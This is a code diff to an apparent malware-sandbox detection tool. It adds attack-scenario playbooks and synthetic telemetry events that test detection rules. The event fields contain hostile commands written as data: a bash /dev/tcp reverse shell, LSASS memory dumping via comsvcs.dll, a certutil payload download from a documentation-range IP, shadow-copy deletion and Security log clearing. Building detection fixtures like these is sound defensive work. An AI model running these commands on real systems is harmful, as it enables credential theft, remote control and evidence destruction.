@@ -413,35 +413,138 @@ async def _live_detonate(provider: str, task: dict, sample_bytes: bytes) -> dict
 
 
 # ---------------------------------------------------------------------------
-# Demo detonation — deterministic, labeled, fires the REAL detection rules
+# Attack Scenario Playbooks & Demo Detonation
 # ---------------------------------------------------------------------------
 
-def demo_events(run_id: str, platform: str, sample_name: str, base: datetime.datetime) -> list[dict]:
+PLAYBOOKS: list[dict[str, Any]] = [
+    {
+        "id": "ransomware-stager",
+        "name": "Ransomware Pre-Encryption & Shadow Eraser",
+        "description": "Simulates volume shadow copy deletion (vssadmin), rapid multi-file encryption burst (.locked), ransom note drop, and Run-key persistence.",
+        "platform": "windows",
+        "severity": "critical",
+        "tactics": ["Defense Evasion", "Impact", "Persistence"],
+        "techniques": ["T1490", "T1486", "T1547.001"],
+    },
+    {
+        "id": "lolbin-credential-dump",
+        "name": "LOLBin & LSASS Credential Dumper",
+        "description": "Macro-spawned obfuscated PowerShell stager executing comsvcs.dll mini-dump against LSASS memory and staging credentials.",
+        "platform": "windows",
+        "severity": "critical",
+        "tactics": ["Initial Access", "Execution", "Credential Access"],
+        "techniques": ["T1566.001", "T1059.001", "T1003.001"],
+    },
+    {
+        "id": "c2-beacon-exfil",
+        "name": "C2 Beaconing & Security Log Eraser",
+        "description": "Certutil LOLBin payload download, persistent periodic C2 heartbeats to known malicious IP, and event log wiping (wevtutil).",
+        "platform": "windows",
+        "severity": "high",
+        "tactics": ["Command & Control", "Defense Evasion", "Exfiltration"],
+        "techniques": ["T1105", "T1071", "T1070.001"],
+    },
+    {
+        "id": "linux-persistence-rootkit",
+        "name": "Linux Cron Persistence & Reverse Shell",
+        "description": "Interactive bash reverse socket connection, /etc/cron.d automated task creation, and system auth log tampering.",
+        "platform": "linux",
+        "severity": "high",
+        "tactics": ["Execution", "Persistence", "Defense Evasion"],
+        "techniques": ["T1059.004", "T1053.003", "T1070.002"],
+    },
+]
+
+
+def list_playbooks() -> list[dict[str, Any]]:
+    """List available attack scenario playbooks for live/interactive detonation."""
+    return PLAYBOOKS
+
+
+def demo_events(
+    run_id: str,
+    platform: str,
+    sample_name: str,
+    base: datetime.datetime,
+    scenario_id: str | None = None,
+) -> list[dict]:
     """A deterministic synthetic detonation whose events are exactly the shape
     the detection engine expects — the same rules fire as on a live analysis,
     so the demo pipeline is the real pipeline end to end."""
-    if platform == "linux":
+    # Specific Playbook Scenarios
+    if scenario_id == "ransomware-stager" or (not scenario_id and "ransom" in sample_name.lower()):
         return [
-            _ev(run_id, platform, "process_create", _seq(base, 0), pid=2000, ppid=1,
-                process_name=sample_name, command_line=f"/tmp/{sample_name}"),
-            _ev(run_id, platform, "process_create", _seq(base, 1), pid=2001, ppid=2000,
+            _ev(run_id, "windows", "process_create", _seq(base, 0), pid=1000, ppid=4,
+                process_name=sample_name, command_line=rf"C:\Users\victim\Downloads\{sample_name}"),
+            _ev(run_id, "windows", "process_create", _seq(base, 1), pid=1001, ppid=1000,
+                process_name="vssadmin.exe", command_line=r"vssadmin.exe delete shadows /all /quiet"),
+            _ev(run_id, "windows", "process_create", _seq(base, 2), pid=1002, ppid=1000,
+                process_name="powershell.exe", command_line=r"powershell.exe -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA="),
+            *[_ev(run_id, "windows", "file_write", _seq(base, 3 + j), pid=1000,
+                  file_path=rf"C:\Users\victim\Documents\database_q{j+1}.mdf.locked") for j in range(6)],
+            _ev(run_id, "windows", "file_write", _seq(base, 10), pid=1000,
+                file_path=r"C:\Users\victim\Desktop\README_HOW_TO_DECRYPT.txt"),
+            _ev(run_id, "windows", "registry_write", _seq(base, 11), pid=1000,
+                process_name=sample_name,
+                registry_key=r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\LockerService"),
+        ]
+
+    if scenario_id == "lolbin-credential-dump" or (not scenario_id and "dump" in sample_name.lower()):
+        return [
+            _ev(run_id, "windows", "process_create", _seq(base, 0), pid=1000, ppid=4,
+                process_name="winword.exe", command_line=r'"C:\Program Files\Microsoft Office\winword.exe" invoice.docm'),
+            _ev(run_id, "windows", "process_create", _seq(base, 1), pid=1001, ppid=1000,
+                process_name="cmd.exe", command_line=r'cmd.exe /c powershell.exe -EncodedCommand SQBFAFgA...'),
+            _ev(run_id, "windows", "process_create", _seq(base, 2), pid=1002, ppid=1001,
+                process_name="rundll32.exe",
+                command_line=r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 C:\Windows\Temp\lsass.dmp full"),
+            _ev(run_id, "windows", "network_connection", _seq(base, 3), pid=1001,
+                dest_ip="198.51.100.45", dest_port=443, protocol="TCP"),
+            _ev(run_id, "windows", "file_write", _seq(base, 4), pid=1002,
+                file_path=r"C:\Windows\Temp\lsass.dmp"),
+        ]
+
+    if scenario_id == "c2-beacon-exfil":
+        return [
+            _ev(run_id, "windows", "process_create", _seq(base, 0), pid=1000, ppid=4,
+                process_name="certutil.exe",
+                command_line=r"certutil.exe -urlcache -split -f https://203.0.113.88/stage2.exe C:\Temp\stage2.exe"),
+            _ev(run_id, "windows", "process_create", _seq(base, 1), pid=1001, ppid=1000,
+                process_name="stage2.exe", command_line=r"C:\Temp\stage2.exe --listen"),
+            _ev(run_id, "windows", "network_connection", _seq(base, 2), pid=1001,
+                dest_ip="203.0.113.88", dest_port=4444, protocol="TCP"),
+            _ev(run_id, "windows", "network_connection", _seq(base, 3), pid=1001,
+                dest_ip="203.0.113.88", dest_port=4444, protocol="TCP"),
+            _ev(run_id, "windows", "network_connection", _seq(base, 4), pid=1001,
+                dest_ip="203.0.113.88", dest_port=4444, protocol="TCP"),
+            _ev(run_id, "windows", "process_create", _seq(base, 5), pid=1002, ppid=1001,
+                process_name="wevtutil.exe", command_line=r"wevtutil.exe cl Security"),
+            _ev(run_id, "windows", "registry_write", _seq(base, 6), pid=1001,
+                registry_key=r"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\Stage2Updater"),
+        ]
+
+    if platform == "linux" or scenario_id == "linux-persistence-rootkit":
+        return [
+            _ev(run_id, "linux", "process_create", _seq(base, 0), pid=2000, ppid=1,
+                process_name="sshd", command_line="sshd: root@pts/2"),
+            _ev(run_id, "linux", "process_create", _seq(base, 1), pid=2001, ppid=2000,
                 process_name="bash",
                 command_line="bash -i >& /dev/tcp/198.51.100.10/4444 0>&1"),
-            _ev(run_id, platform, "network_connection", _seq(base, 2), pid=2001,
+            _ev(run_id, "linux", "network_connection", _seq(base, 2), pid=2001,
                 dest_ip="198.51.100.10", dest_port=4444, protocol="TCP"),
-            _ev(run_id, platform, "network_connection", _seq(base, 3), pid=2001,
+            _ev(run_id, "linux", "network_connection", _seq(base, 3), pid=2001,
                 dest_ip="198.51.100.10", dest_port=4444, protocol="TCP"),
-            _ev(run_id, platform, "network_connection", _seq(base, 4), pid=2001,
+            _ev(run_id, "linux", "network_connection", _seq(base, 4), pid=2001,
                 dest_ip="198.51.100.10", dest_port=4444, protocol="TCP"),
-            _ev(run_id, platform, "network_connection", _seq(base, 5), pid=2000,
+            _ev(run_id, "linux", "network_connection", _seq(base, 5), pid=2000,
                 dest_ip="1.1.1.1", dest_port=443, protocol="TCP"),
-            *[_ev(run_id, platform, "file_write", _seq(base, 6 + j), pid=2000,
+            *[_ev(run_id, "linux", "file_write", _seq(base, 6 + j), pid=2000,
                   file_path=f"/tmp/staged_{j:03d}.enc") for j in range(5)],
-            _ev(run_id, platform, "file_write", _seq(base, 12), pid=2000,
-                process_name=sample_name,
-                file_path="/home/victim/.config/autostart/update.desktop"),
+            _ev(run_id, "linux", "file_write", _seq(base, 12), pid=2000,
+                file_path="/etc/cron.d/system_updater"),
         ]
-    # Windows demo
+
+    # Default Windows demo
     return [
         _ev(run_id, platform, "process_create", _seq(base, 0), pid=1000, ppid=4,
             process_name=sample_name,
